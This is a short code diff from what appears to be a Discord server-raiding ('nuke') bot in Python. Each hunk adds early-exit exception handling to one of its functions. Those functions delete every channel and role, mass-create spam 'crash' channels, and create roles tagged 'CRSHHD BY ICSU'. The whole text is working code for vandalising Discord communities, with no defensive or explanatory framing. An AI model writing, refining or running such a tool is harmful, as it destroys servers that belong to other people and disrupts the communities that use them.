@@ -128,6 +128,8 @@ async def wipe_channels(guild, create_one=False):
     for channel in guild.channels:
         try:
             await channel.delete()
+        except (discord.Forbidden, discord.NotFound):
+            return
         except:
             pass
 
@@ -138,6 +140,8 @@ async def create_crash_channels(guild):
         try:
             ch = await guild.create_text_channel(CRASH_CHANNEL_NAME.format(i))
             channels.append(ch)
+        except (discord.Forbidden, discord.NotFound):
+            return
         except:
             continue
     return channels
@@ -148,6 +152,8 @@ async def delete_roles(guild):
         if role.name != "@everyone":
             try:
                 await role.delete()
+            except (discord.Forbidden, discord.NotFound):
+                return
             except:
                 continue
 
@@ -156,6 +162,8 @@ async def create_roles(guild):
     for _ in range(10):
         try:
             await guild.create_role(name="CRSHHD BY ICSU", permissions=Permissions.none())
+        except (discord.Forbidden, discord.NotFound):
+            return
         except:
             continue
 
